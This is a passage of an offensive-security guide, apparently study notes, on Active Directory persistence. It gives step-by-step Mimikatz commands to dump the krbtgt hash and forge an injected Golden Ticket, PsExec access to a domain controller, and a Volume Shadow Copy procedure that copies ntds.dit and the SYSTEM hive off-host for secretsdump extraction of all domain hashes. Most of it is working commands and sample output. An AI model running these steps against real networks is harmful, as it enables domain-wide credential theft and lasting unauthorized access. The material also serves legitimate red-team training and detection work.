### References

- [Mimikatz: Windows Privilege Escalation](https://github.com/gentilkiwi/mimikatz)
    
- [BloodHound: Active Directory Attack Mapping](https://bloodhound.readthedocs.io/en/latest/)
    
- [Impacket: AD Attacks](https://github.com/SecureAuthCorp/impacket)
    
- [Microsoft Docs: Volume Shadow Copy Service (VSS)](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
    

---

## Golden Ticket Persistence

Golden Tickets allow an attacker to persist indefinitely within an Active Directory environment by forging Ticket Granting Tickets (TGTs).

### Extracting the `krbtgt` Hash

The `krbtgt` account is the Kerberos service account used for encrypting TGTs. If compromised, attackers can generate their own TGTs.

1. Obtain the `krbtgt` NTLM hash using Mimikatz:
    
    ```powershell
    mimikatz # privilege::debug
    mimikatz # lsadump::lsa /patch
    ```
    
    Example output:
    
    ```
    RID  : 000001f6 (502)
    User : krbtgt
    LM   :
    NTLM : 1693c6cefafffc7af11ef34d1c788f47
    ```
    
    This NTLM hash will be used to forge a Golden Ticket.
    

### Crafting a Golden Ticket

With the extracted `krbtgt` hash, create a Golden Ticket:

```powershell
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

This injects the forged ticket into memory, allowing persistent domain access.

### Verifying the Ticket

Confirm the Golden Ticket is active:

```powershell
klist
```

Use the ticket to execute commands as a privileged user:

```powershell
C:\Tools\SysinternalsSuite>.\PsExec.exe \\dc1 cmd.exe
```

If successful, the user gains administrative access to the domain controller.

---

## Shadow Copy Persistence

Windows Volume Shadow Copy Service (VSS) allows attackers to extract Active Directory database files for offline credential dumping.

### Creating a Shadow Copy

1. Run the following on a compromised Domain Controller:
    
    ```powershell
    C:\Tools>vshadow.exe -nw -p C:
    ```
    
    Example output:
    
    ```
    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
    ```
    
2. Copy the NTDS database from the shadow copy:
    
    ```powershell
    C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
    ```
    
3. Extract the SYSTEM hive:
    
    ```powershell
    C:\>reg.exe save hklm\system c:\system.bak
    ```
    
4. Transfer the `ntds.dit.bak` and `system.bak` files to an attacker-controlled machine.
    

### Dumping Credentials from the Shadow Copy

On an attacker-controlled machine, use Impacket’s `secretsdump.py` to extract credentials:

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

This extracts NTLM hashes of all domain users, allowing for further attacks such as Pass-the-Hash (PtH).